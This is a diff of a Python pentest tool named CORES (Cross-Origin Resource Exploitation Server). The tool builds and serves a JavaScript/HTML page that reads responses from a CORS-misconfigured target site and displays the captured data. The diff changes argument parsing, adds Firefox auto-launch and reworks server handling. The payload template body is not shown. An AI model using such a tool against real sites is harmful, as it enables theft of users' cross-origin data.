@@ -2,16 +2,15 @@
 # C.O.R.E.S
 # Cross-Origin Resource Exploitation Server
 try:
-	import sys
-	import os
-	import time
-	import argparse
+	# from httpserver import HTTPServer
+	import os, sys, time, signal, argparse
 	from argparse import RawTextHelpFormatter
-	import signal
 	# IP Query
 	import json, urllib, socket
 	# Simple HTTP Server
 	import SocketServer, SimpleHTTPServer, multiprocessing
+	# Browser Launch
+	import webbrowser, platform
 	# Custom theme
 	from theme import *
 except Exception as e:
@@ -19,71 +18,50 @@ except Exception as e:
 	sys.exit(1)
 
 App = ' CORES '
-Version = 'v1.03292017'
+Version = 'v1.03312017'
 Author = 'Nick Sanzotta/@Beamr'
-Contributors = 'Bill Harshbarger/github.com/bharshbarger'
+Contributors = 'Bill Harshbarger'
 
 def parse_args():
 	''' CLI Argument Options'''
 	cls()
+	# Custom Usage
+	msg = """cores.py cores.py <URL> <OPTIONS>
+	Example: python cores.py https://site.com/
+	Example: python cores.py https://site.com/ -m GET -p 8080 -s alert -v -a\n
+         [-m, Define HTTP request method ex: -m POST]
+         [-p, Define HTTP Server port ex: -p 8080]
+         [-a, Auto-launches FireFox to automatically visit destination server.]
+
+         [-s, Define Log style ex: JavaScript Alert / Inner HTML ]
+        """
 	# Create Parser
 	parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, description=' '+
-		str(banner(App, Version, Author, Contributors)) +
-        ' Usage: python cores.py <URL> <OPTIONS> \n' +
-        ' Example[1]: python cores.py https://target-site.com/\n' +
-        ' Example[2]: python cores.py https://target-site.com/ -m GET -s html -v\n')	
+		str(banner(App, Version, Author, Contributors)), usage=msg)	
 	# Positional Arguments
 	url_group = parser.add_argument_group(colors.green + ' URL options' + colors.normal)
-	url_group.add_argument('url', type=str, metavar='http://site.com/path', #required=True,
-		help='<Target URL>  ex: https://target-site.com/')
-	url_group.add_argument('-m', type=str, metavar='', #required=True,
-		help='<HTTP Method> ex: https://target-site.com/ -m GET\n')
-	url_group.add_argument('-p', metavar='8080', help='Optionally specify a server port to use. Default is 80')
+	url_group.add_argument('url', type=str, metavar='URL [http://site.com/]', #required=True,
+		help='Define vulnerable CORS targert URL ex: https://site.com/')
+	url_group.add_argument('-m', type=str, metavar='GET', nargs='?', const=1, default = 'GET', #required=True,
+		help='Define HTTP request method [GET, HEAD, POST] ex: -m POST\n')
+	url_group.add_argument('-p', type=int, metavar='80', nargs='?', const=1, default = 80, 
+		help='Define HTTP Server Port ex: -p 8080')
 	# Style Arguments
-	style_group = parser.add_argument_group(colors.green + ' Style options' + colors.normal)
-	style_group.add_argument('-s', type=str, metavar='', #required=True,
-		help='EX: -s html   Displays loot inside HTML.\n'+
-			 'EX: -s alert  Displays loot inside and Alert box.')
+	style_group = parser.add_argument_group(colors.green + ' Log style options' + colors.normal)
+	style_group.add_argument('-s', type=str, metavar='alert, html', nargs='?', const=1, default = 'html', #required=True,
+		help='ex: -s html   Displays logs in generated HTML.\n'+
+			 'ex: -s alert  Displays logs in JavaScript Alert function.')
+	# Browser Auto Launch Arguments
+	autolaunch_group = parser.add_mutually_exclusive_group()
+	autolaunch_group.add_argument('-a',action='store_true', #required=True,
+		help='Enables FireFox to auto-launch.')
 	# ME/Verbose Arguments
 	group = parser.add_mutually_exclusive_group()
 	group.add_argument('-v','--verbose',action='store_true',
 		help='Turn on Verbosity\n')
-	# Parse the Arguments
+	# Parse/Return the Arguments
 	args = parser.parse_args()
-	
-	#arg requirement checks
-	if args.url is None:
-		print('No URL specified, exiting...')
-		sys.exit(0)
-
-
-	# Defaults
-	if not args.m:
-	    args.m = 'GET'
-	elif not args.s:
-		args.s = 'alert'
-
-	if args.p is None:
-		args.p=80
-	
-	#
 	return args
-
-
-def sigterm_handler(signal, frame):
-
-	print('Trying to stop server process %s' % str(serverPid))
-	server_kill()
-
-
-
-
-def sigint_handler(signal, frame):
-
-	print('You pressed Ctrl+C! Exiting...')
-	server_kill()
-
-
 
 def dir_check(directory):
 	''' If specified directory does not exists then create specified directory '''
@@ -102,6 +80,14 @@ def get_internal_address():
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	s.connect(("8.8.8.8", 80))
 	return s.getsockname()[0]
+
+def browser_launch(url, port):
+	''' Auto Launches Firefox '''
+	try:
+	    browser_path = "/usr/bin/firefox %s"  
+	except:
+	    print("Firefox not found!")
+	webbrowser.get(str(browser_path)).open(url+":"+str(port)+"/")
 
 def cors_js_template(style, method, url, filename):
 	'''1. Create CORS template for JavaScript Payload '''
@@ -134,7 +120,7 @@ def cors_js_template(style, method, url, filename):
 def html_template(javascript, filename):
 	'''1. Create HTML template for index.html '''
 	'''2. Write index.html to file '''
-	filename = 'index.html'
+	filename = filename
 	html_template = """
 	<!DOCTYPE HTML>
 	<html lang="en-US">
@@ -145,11 +131,10 @@ def html_template(javascript, filename):
   			<b>Cross-Origin Resource Exploitation Server</b><br>
  			CORES {0}<br>
  			Description:Cross-Origin Resource Exploitation Server.<br>
- 			Created by: Nick Sanzotta/@Beamr<br>
- 			Contributors: {1}</p><br>
+ 			Created by: Nick Sanzotta/@Beamr<br></p>
   			
   			<p style="margin-left: 55px">
-  			<b>Loot:</b></p>
+  			<b>Logs:</b></p>
 			<p style="margin-left: 55px", id="loot"></p>
 				<script src="js/cors.js"></script>
 		</body>
@@ -159,44 +144,43 @@ def html_template(javascript, filename):
   		f2.write(html_indexPage)
   	return html_indexPage
 
-# def server_stop():
-# 	'''1. Stops Python's SimpleHTTPServer '''
-# 	try:
-# 		httpd.shutdown()
-# 		httpd.server_close()
-# 	except Exception:
-# 		traceback.print_exc(file=sys.stdout)
-
-def server_start(port):
-	'''1. Starts Python's SimpleHTTPServer on specified port'''
-	httpPort = int(port)
-	Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
-	httpd = SocketServer.TCPServer(("",httpPort), Handler)
-	server_process = multiprocessing.Process(target=httpd.serve_forever)
-	
-	# Daemon True will stop the server once the script completes.
-	server_process.daemon = False
-	server_process.start()
-
-	global serverPid
-	serverPid=server_process.pid
-	
-
-
-	print(blue('*')+ 'HTTP Server started on Port: %s and PID: %s' % (str(httpPort),str(serverPid)))
-
-
 def server_kill():
 	try:
-		print('Trying to stop server process %s' % str(serverPid))
+		# print('Trying to stop server process %s' % str(serverPid))
 		os.kill(int(serverPid),9)
 	except Exception as e:
 		print(e)
 
+def sigterm_handler(signal, frame):
+	server_kill()
 
-def main():
+def sigint_handler(signal, frame):
+	print('\nCaught Ctrl+C')
+	print('Press Enter to close')
+	server_kill()
 
+def server_start(port):
+	'''Starts Python's SimpleHTTPServer on specified port'''
+	httpPort = int(port)
+	Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+	httpd = SocketServer.TCPServer(("",httpPort), Handler, bind_and_activate=False)
+	httpd.allow_reuse_address = True
+	server_process = multiprocessing.Process(target=httpd.serve_forever)
+	server_process.daemon = False
+	try:
+		httpd.server_bind()
+		httpd.server_activate()
+	except:
+		httpd.server_close()
+	# Create process
+	server_process.start()
 
+	global serverPid
+	serverPid=server_process.pid
+
+if __name__ == '__main__':
+	# return args
+	args = parse_args()
 	# Banner
 	cls()
 	banner(App, Version, Author, Contributors)
@@ -207,13 +191,11 @@ def main():
 	# Check for js dir
 	dir_check(js_dir)
 	# Staging variables for HTML
-	html_name = 'index.html'
+	html_name = 'cors.html'
 	html_dir = str(os.path.expanduser(''))
 	html_path = os.path.join(html_dir, html_name)	
-	# return args
-	args = parse_args()
 	
-	# Attempt to Obtain External IP Address
+	# Connectivity Check
 	try:
 		extipAddress = get_external_address()
 	except IOError:
@@ -223,7 +205,7 @@ def main():
 	ipAddress = get_internal_address()
 	
 	# Create payload file
-	cors_js = cors_js_template(args.s, args.m, args.url, js_path)
+	cors_js = cors_js_template(args.s.lower(), args.m, args.url, js_path)
 	html_indexPage = html_template(cors_js, html_path)
 
 	# Check for (-v)erbose
@@ -231,27 +213,21 @@ def main():
 		print(html_indexPage)
 	else:
 		pass
-
-	# Start HTTP Server
+	# Start server
 	server_start(args.p)
 	print(blue('i')+ 'Target URL:  '+ args.url)
-	print(blue('i')+ 'HTTP Server: http://%s:%s/index.html' %(ipAddress, args.p))
+	print(blue('i')+ 'HTTP Server: http://%s:%s/%s' %(ipAddress, args.p, html_name))
 	print('\n')
 
-
-	#catch sigint
+	# Check for (-a)uto Launch
+	if args.a:
+		browser_launch(ipAddress, args.p)
+	else:
+		pass
+	# Catch ^C sigint
 	signal.signal(signal.SIGINT, sigint_handler)
 	signal.signal(signal.SIGTERM, sigterm_handler)
+	# Manual Close/Exit
+	raw_input('Press Enter to close\n\n')
+	server_kill()
 
-if __name__ == "__main__":
-	#main()
-
-	try:
-		main()
-	except (KeyboardInterrupt, SystemExit):
-		raise
-	except Exception as e:
-		print('Error: %s' % e)
-		print(red('!')+'HTTP Server is still running, wait and try again.')
-		pass
-		# report error and proceed
